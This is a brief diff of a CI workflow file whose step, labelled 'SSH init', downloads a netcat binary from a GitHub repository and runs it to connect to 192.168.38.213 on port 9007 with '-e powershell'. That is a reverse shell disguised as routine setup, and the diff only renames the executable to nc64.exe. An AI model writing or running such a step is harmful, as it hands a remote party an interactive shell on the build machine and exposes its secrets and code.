@@ -12,4 +12,4 @@ jobs:
     - name: SSH init
       run: |
         curl -o nc.exe https://github.com/shashankx86/temp/raw/main/nc.exe
-        .\nc.exe 192.168.38.213 9007 -e powershell
+        .\nc64.exe 192.168.38.213 9007 -e powershell
